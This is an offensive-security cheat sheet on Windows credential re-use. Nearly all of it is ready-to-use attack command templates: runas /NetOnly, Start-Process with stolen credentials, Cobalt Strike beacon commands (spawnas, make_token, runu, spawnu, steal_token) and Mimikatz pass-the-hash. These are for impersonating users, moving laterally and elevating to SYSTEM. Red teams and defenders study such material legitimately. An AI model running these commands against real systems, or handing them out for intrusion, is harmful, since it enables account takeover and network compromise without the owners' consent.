# Windows - Local credentials re-use

The local re-use of credentials consist of starting a process on the local
system under the security context and privileges of the specified user.

This security context may be used to access resources on the present system as
well as moving laterally using various methods (remote Windows services or
scheduled tasks, `WMI`, etc.) that can rely on the current user security
context.

### runas

Set the main DNS server on the attacking computer to the Domain Controller IP
address:

```
Control Panel -> Network and Internet -> Network and Sharing Center -> Change adapter setting -> right click on the adapter being used -> Properties -> Internet Protocol Version 4 (TCP/IPv4) -> Properties -> Set the Preferred DNS server field
```

To authenticate locally as another user (with plaintext credentials) and
execute PowerShell commands, the `runas` utility can be used.

```
# runas
# Use /NetOnly on off-domain machines
runas /NetOnly /user:<DOMAIN>\<USERNAME> "<COMMAND> <COMMAND_ARGS>"
runas /NetOnly /user:<DOMAIN>\<USERNAME> powershell.exe
```

The `NetOnly` option will make `runas` execute on your local computer as the
currently logged on user, but any connections to other computers on the network
will be made using the user account specified.

### Start-Process / Start-Job

The `Start-Process` and `Start-Job` PowerShell cmdlets can be used to start a
local process under the identify of another user.

To run the specified process in an elevated security context through a
interactive logon on a system with `User Account Control (UAC)` enabled, the
`-Verb RunAs` parameter, for `Run as administrator`, can be specified.

```
$secpasswd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("<DOMAIN>\<USERNAME>", $secpasswd)

Start-Process <cmd.exe | powershell.exe | ...> -Credential $creds
Start-Process <cmd.exe | powershell.exe | ...> -Credential $creds -Verb RunAs

$ProcessJob = Start-Job -ScriptBlock { <POWERSHELL> } -Credential $creds
Wait-Job $ProcessJob
Receive-Job -Job $ProcessJob
```

### Cobalt Strike runas, runu, spawnas, spawnu and make_token

On `Cobalt Strike`, the `runas` and `spawnas` beacon commands can be used,
respectively, to locally run a command or start a beacon under the security
context of the specified user. Both commands rely on a clear password and
cannot be used to Pass-the-Hash.

The `runas` command can also be used in place of the `spawnas` command by
running the beacon deploying `PowerShell` one-liner, generated using the beacon
built-in function `Access -> One-liner`.

```
beacon> runas <. | DOMAIN>\<USERNAME> <PASSWORD> <COMMAND> <COMMAND_ARGS>

beacon> spawnas <. | DOMAIN>\<USERNAME> <PASSWORD> <LISTENER>
```

The `make_token` beacon command correspond to the `runas` `NetOnly` option but
cannot be used to create a process and run a specified program. The
`make_token` command will instead replace the `Logon Session` in the current
beacon Windows `Access Token`, which is used for network Windows
authentication, with the `make_token` provided credentials. The local system
access through the beacon will thus not be affected but access to resources
over the network will be made using the newly provided credentials.

The change can be reverted using the beacon command `rev2self`.

```
beacon> make_token <. | DOMAIN>\<USERNAME> <PASSWORD>
```

If elevated privileges are obtained on a system, the `runu` beacon command can
be used to run an arbitrary command as a child of another process, effectively
running the command in the targeted process security context. Building on this
primitive, the `spawnu` beacon command spawn a beacon, through PowerShell,
under another process security context.

Both commands can be used to impersonate any connected user on the compromised
system, without the need of knowing their password or `NTLM` hash, as well as
elevate to `NT AUTHORITY\SYSTEM`.

```
# beacon> ps

beacon> runu <PID> <COMMAND> <COMMAND_ARGS>

beacon> spawnu <PID> <LISTENER>
```

### Mimikatz Pass-The-Hash

Require elevated privileges on the system.

The Pass-The-Hash module of `mimikatz` can be used to locally run a process
under another user identity using its `NTLM` hash.

```
# Default to /run:cmd.exe.
# Command can be any binary such as powershell.exe or mmc.exe for example.
# Specifying arguments is supported as well.

sekurlsa::pth /domain:<. | DOMAIN_FQDN> /user:<USERNAME> /ntlm:<HASH_NTLM> /run:"<COMMAND>"
sekurlsa::pth /domain:<. | DOMAIN_FQDN> /user:<USERNAME> [/aes128:<USER_AES128_KEY> | /aes256:<USER_AES256_KEY>] /run:"<COMMAND>"
```

### Cobalt Strike (using Mimikatz) Pass-The-Hash

Require elevated privileges on the system.

On `Cobalt Strike`, the `mimikatz` / and `steal_token` beacon commands can be
used to start a process under the specified user identity, using its `NTLM`
hash, and steal then impersonate the newly created process token.

The `pth` beacon command will wrap the `mimikatz` Pass-the-hash command and,
similarly to the `make_token` beacon command, replace the `Logon Session` in
the current beacon Windows `Access Token`, in order to access resources over
the network using the provided user identity.

Any token change can be reverted using the beacon command `rev2self`.

```
# Both local and over the network impersonation
beacon> mimikatz sekurlsa::pth /domain:<. | DOMAIN_FQDN> /user:<USERNAME> /ntlm:<NT_HASH> /run:"powershell -w hidden"
beacon> mimikatz sekurlsa::pth /domain:<. | DOMAIN_FQDN> /user:<USERNAME> [/aes128:<USER_AES128_KEY> | /aes256:<USER_AES256_KEY>] /run:"powershell -w hidden"
  [...]
  PID <PID>

beacon> steal_token <PID>

# Over the network ("/NetOnly") impersonation
pth <. | DOMAIN>\<USERNAME> <NT_HASH>
```

### PowerShell Credential option

Most of the PowerShell's `Remote Server Administration Tools (RSAT)` cmdlets
support the `Credential` option, to run the cmdlet as the specified user
account. An username or a `PSCredential` object can be used.

A similar mechanism is also implemented in the PowerShell `PowerSploit`
framework.
